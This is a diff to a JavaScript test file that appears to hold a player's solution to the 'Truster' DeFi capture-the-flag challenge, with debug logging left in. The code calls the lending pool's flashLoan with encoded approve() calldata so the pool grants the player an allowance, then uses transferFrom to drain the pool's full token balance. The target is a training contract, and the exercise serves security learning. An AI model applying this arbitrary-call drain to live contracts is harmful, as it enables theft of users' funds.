@@ -25,7 +25,29 @@ describe('[Challenge] Truster', function () {
         /** CODE YOUR SOLUTION HERE */
         //just starting my hacking. I think my play is to approve the token to be spent by calling
         //trusterlender pool then approve the DV token to be spent. then in the second transaction. we will drain
-        await pool.connect(player)
+        //console.log("tokenIFace:", token.interface)
+        const poolBalance = await token.balanceOf(pool.address)
+        console.log("poolBalance:", poolBalance)
+        //const hackedData = token.interface.encodeFunctionData("approve", [playar.address, poolBalance]);
+        //console.log("hackedData:", hackedData)
+        console.log("pooladdress:", pool.address)
+        //console.log("address(pool)", address(pool))
+       // console.log("addresss(token)", address(token))
+        console.log("tokenaddress:", token.address)
+        await pool.connect(player).flashLoan(
+            0, 
+            player.address, 
+            token.address, 
+            token.interface.encodeFunctionData("approve", [player.address, poolBalance])
+            )
+        console.log('benchmark 1')
+        const getAllow = await token.allowance(pool.address, player.address)
+        console.log("getAllow", getAllow)
+        console.log('benchmark 2')
+        await token.connect(player).transferFrom(pool.address, player.address, poolBalance)
+        console.log('benchmark 3')
+        const playerBalance = await token.balanceOf(player.address)
+        console.log("playerBalance:", playerBalance)
     });
 
     after(async function () {
